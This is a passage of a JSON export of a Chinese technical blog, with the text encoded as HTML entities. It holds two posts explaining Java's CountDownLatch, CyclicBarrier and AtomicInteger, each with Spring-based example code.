&#x5C31;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;wait&#x548C;notify&#xFF0C;&#x5B83;&#x4EEC;&#x4F7F;&#x7528;&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x66F4;&#x9AD8;&#x7EA7;&#x5E76;&#x53D1;&#x5DE5;&#x5177;&#x6765;&#x66FF;&#x4EE3;&#x3002; &#x56FE;&#x4E00;&#x6240;&#x8BF4;&#x7684;&#x540C;&#x6B65;&#x5668;&#x662F;&#x6307;&#x90A3;&#x4E9B;&#x80FD;&#x4F7F;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x6709;cyclicBarrier&#x548C;&#x5012;&#x8BA1;&#x6570;&#x9501;&#x5B58;&#x5668;CountDownLatch&#x548C;semaphore&#x3002; CountDownLatch&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5728;&#x5B8C;&#x6210;&#x4E00;&#x7EC4;&#x6B63;&#x5728;&#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x7B49;&#x5F85;&#x3002;&#x5B83;&#x7684;&#x5012;&#x8BA1;&#x6570;&#x7C7B;&#x4F3C;&#x4E8E;AutomicInteger&#x7684;getAndDecrement()&#x3002;&#x4F46;&#x5B83;&#x8FD8;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x7C7B;&#x4F3C;&#x4E8E; wait&#x548C;notify&#x3002;","keywords":null,"text":"&#x300A; Effecit In Java &#x300B;&#x8BF4;&#x8FC7;&#xFF0C;&#x4ECE;java 1.5&#x53D1;&#x73B0;&#x7248;&#x672C;&#x5F00;&#x59CB;, &#x5C31;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;wait&#x548C;notify&#xFF0C;&#x5B83;&#x4EEC;&#x4F7F;&#x7528;&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x66F4;&#x9AD8;&#x7EA7;&#x5E76;&#x53D1;&#x5DE5;&#x5177;&#x6765;&#x66FF;&#x4EE3;&#x3002; &#x56FE;&#x4E00;&#x6240;&#x8BF4;&#x7684;&#x540C;&#x6B65;&#x5668;&#x662F;&#x6307;&#x90A3;&#x4E9B;&#x80FD;&#x4F7F;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x6709;cyclicBarrier&#x548C;&#x5012;&#x8BA1;&#x6570;&#x9501;&#x5B58;&#x5668;CountDownLatch&#x548C;semaphore&#x3002; CountDownLatch&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5728;&#x5B8C;&#x6210;&#x4E00;&#x7EC4;&#x6B63;&#x5728;&#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x7B49;&#x5F85;&#x3002;&#x5B83;&#x7684;&#x5012;&#x8BA1;&#x6570;&#x7C7B;&#x4F3C;&#x4E8E;AutomicInteger&#x7684;getAndDecrement()&#x3002;&#x4F46;&#x5B83;&#x8FD8;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x7C7B;&#x4F3C;&#x4E8E; wait&#x548C;notify&#x3002;&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package com.bbk.u001.handle;import java.util.concurrent.CountDownLatch;import javax.annotation.PostConstruct;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;import org.springframework.stereotype.Component;/** * CountDownLatch&#x7684;&#x4F7F;&#x7528; * @ClassName: StatsSimilarKnowledgeHandle * @Description: TODO * @author wasim * @create at 2015-8-12 &#x4E0B;&#x5348;8:44:51 * */@Componentpublic class CountDownLatchHandle { @Autowired ThreadPoolTaskExecutor executor; @PostConstruct public void handleStatsQuestionKnowledge(){ CountDownLatch startSignal = new CountDownLatch(12); //&#x5BFC;&#x51FA;&#x6587;&#x4EF6; executor.execute(new ExportStats(startSignal)); //&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5FAA;&#x73AF;&#x4E0B;&#x9762;12&#x4E2A;&#x7EBF;&#x7A0B; for(int i=0;i&lt;12;i++){ executor.execute(new similarKnowledgeHandle(startSignal)); } } public class similarKnowledgeHandle implements Runnable{ CountDownLatch startSignal; public similarKnowledgeHandle(CountDownLatch startSignal) { this.startSignal =startSignal; } @Override public void run() { startSignal.countDown(); System.out.println(startSignal.getCount()); //&#x663E;&#x793A;&#x5F53;&#x524D;&#x8BA1;&#x6570; } } public class ExportStats implements Runnable{ CountDownLatch startSignal; public ExportStats(CountDownLatch startSignal) { this.startSignal =startSignal; } @Override public void run() { try { startSignal.await(); //&#x5F53;&#x8BA1;&#x6570;&#x4E3A;0&#x524D;&#xFF0C;&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x5904;&#x4E8E;&#x7B49;&#x5F85;&#x72B6;&#x6001; System.out.println(&quot;start export.......&quot;); } catch (InterruptedException e) { e.printStackTrace(); } } }} cyclicBarrier&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x7EC4;&#x7EBF;&#x7A0B;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#xFF0C;&#x76F4;&#x5230;&#x5230;&#x8FBE;&#x67D0;&#x4E2A;&#x516C;&#x5171;&#x5C4F;&#x969C;&#x70B9; (common barrier point)&#x3002;&#x5728;&#x6D89;&#x53CA;&#x4E00;&#x7EC4;&#x56FA;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x7EBF;&#x7A0B;&#x7684;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;&#x5FC5;&#x987B;&#x4E0D;&#x65F6;&#x5730;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#xFF0C;&#x6B64;&#x65F6; CyclicBarrier &#x5F88;&#x6709;&#x7528;&#x3002;&#x56E0;&#x4E3A;&#x8BE5; barrier &#x5728;&#x91CA;&#x653E;&#x7B49;&#x5F85;&#x7EBF;&#x7A0B;&#x540E;&#x53EF;&#x4EE5;&#x91CD;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x79F0;&#x5B83;&#x4E3A;&#x5FAA;&#x73AF; &#x7684; barrier&#x3002; &#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435363738class Solver { final int N; final float[][] data; final CyclicBarrier barrier; class Worker implements Runnable { int myRow; Worker(int row) { myRow = row; } public void run() { while (!done()) { processRow(myRow); try { barrier.await(); } catch (InterruptedException ex) { return; } catch (BrokenBarrierException ex) { return; } } } } public Solver(float[][] matrix) { data = matrix; N = matrix.length; barrier = new CyclicBarrier(N, new Runnable() { public void run() { mergeRows(...); } }); for (int i = 0; i &lt; N; ++i) new Thread(new Worker(i)).start(); waitUntilDone(); } } cyclicBarrier &#x548C; CountDownLatch &#x7684;&#x533A;&#x522B;","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"concurrent","slug":"concurrent","permalink":"http://www.wangxin123.com/tags/concurrent/"}]},{"title":"AtomicInteger的使用","slug":"AtomicInteger的使用","date":"2016-04-16T14:41:19.000Z","updated":"2016-11-17T11:59:42.660Z","comments":true,"path":"2016/04/16/AtomicInteger的使用/","link":"","permalink":"http://www.wangxin123.com/2016/04/16/AtomicInteger的使用/","excerpt":"JDK API 1.7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;&#x53EF;&#x4EE5;&#x7528;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x66F4;&#x65B0;&#x7684; int &#x503C;&#x3002;&#x6709;&#x5173;&#x539F;&#x5B50;&#x53D8;&#x91CF;&#x5C5E;&#x6027;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; java.util.concurrent.atomic &#x5305;&#x89C4;&#x8303;&#x3002;AtomicInteger &#x53EF;&#x7528;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF08;&#x5982;&#x4EE5;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x589E;&#x52A0;&#x7684;&#x8BA1;&#x6570;&#x5668;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;&#x66FF;&#x6362; Integer&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x6B64;&#x7C7B;&#x786E;&#x5B9E;&#x6269;&#x5C55;&#x4E86; Number&#xFF0C;&#x5141;&#x8BB8;&#x90A3;&#x4E9B;&#x5904;&#x7406;&#x57FA;&#x4E8E;&#x6570;&#x5B57;&#x7C7B;&#x7684;&#x5DE5;&#x5177;&#x548C;&#x5B9E;&#x7528;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x8BBF;&#x95EE;&#x3002;","keywords":null,"text":"JDK API 1.7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;&#x53EF;&#x4EE5;&#x7528;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x66F4;&#x65B0;&#x7684; int &#x503C;&#x3002;&#x6709;&#x5173;&#x539F;&#x5B50;&#x53D8;&#x91CF;&#x5C5E;&#x6027;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; java.util.concurrent.atomic &#x5305;&#x89C4;&#x8303;&#x3002;AtomicInteger &#x53EF;&#x7528;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF08;&#x5982;&#x4EE5;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x589E;&#x52A0;&#x7684;&#x8BA1;&#x6570;&#x5668;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;&#x66FF;&#x6362; Integer&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x6B64;&#x7C7B;&#x786E;&#x5B9E;&#x6269;&#x5C55;&#x4E86; Number&#xFF0C;&#x5141;&#x8BB8;&#x90A3;&#x4E9B;&#x5904;&#x7406;&#x57FA;&#x4E8E;&#x6570;&#x5B57;&#x7C7B;&#x7684;&#x5DE5;&#x5177;&#x548C;&#x5B9E;&#x7528;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x8BBF;&#x95EE;&#x3002; AtomicInteger &#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x6570;&#x52A0;100&#x6B21;&#xFF0C;&#x7ED3;&#x679C;&#x4E00;&#x5B9A;&#x662F;100. &#x76F8;&#x5173;&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import java.util.concurrent.CountDownLatch;import java.util.concurrent.atomic.AtomicInteger;import javax.annotation.PostConstruct;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;import org.springframework.stereotype.Component;/** * @ClassName: AtomicIntegerHandle * @Description: AtomicInteger&#x7684;&#x4F7F;&#x7528; * @author wasim * @create at 2015-8-12 &#x4E0B;&#x5348;8:44:51 * */@Componentpublic class AtomicIntegerHandle { @Autowired ThreadPoolTaskExecutor executor; @PostConstruct public void handleQuestionKnowledge(){ AtomicInteger atomicInteger = new AtomicInteger(); int round = 15; //&#x8981;&#x6267;&#x884C;&#x7684;&#x7EBF;&#x7A0B;&#x603B;&#x6570; //&#x5BFC;&#x51FA;&#x6587;&#x4EF6; executor.execute(new ExportStats(atomicInteger, round)); //&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5FAA;&#x73AF;&#x4E0B;&#x9762;12&#x4E2A;&#x7EBF;&#x7A0B; for(int i=0;i&lt;round;i++){ executor.execute(new similarKnowledgeHandle(atomicInteger)); } } public class similarKnowledgeHandle implements Runnable{ AtomicInteger atomicInteger; public similarKnowledgeHandle(AtomicInteger atomicInteger) { this.atomicInteger =atomicInteger; } @Override public void run() { System.out.println(&quot;do some thing....&quot;); atomicInteger.getAndIncrement(); System.out.println(atomicInteger.get()); //&#x663E;&#x793A;&#x5F53;&#x524D;&#x8BA1;&#x6570; } } public class ExportStats implements Runnable{ AtomicInteger atomicInteger; int round; public ExportStats(AtomicInteger atomicInteger, int round) { this.atomicInteger =atomicInteger; this.round = round; } @Override public void run() { try { boolean flag = true; while(flag){ if(atomicInteger.get() == round){ flag = false; System.out.println(&quot;&#x9884;&#x5904;&#x7406;&#x5B8C;&#x6210;,&#x5F00;&#x59CB;&#x6267;&#x884C;&#x76F8;&#x5173;...&quot;); } else { System.out.println(&quot;wait...&quot;); Thread.sleep(1000); } } } catch (Exception e) { e.printStackTrace(); } } }}","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"concurrent","slug":"concurrent","permalink":"http://www.wangxin123.com/tags/concurrent/"}]}]}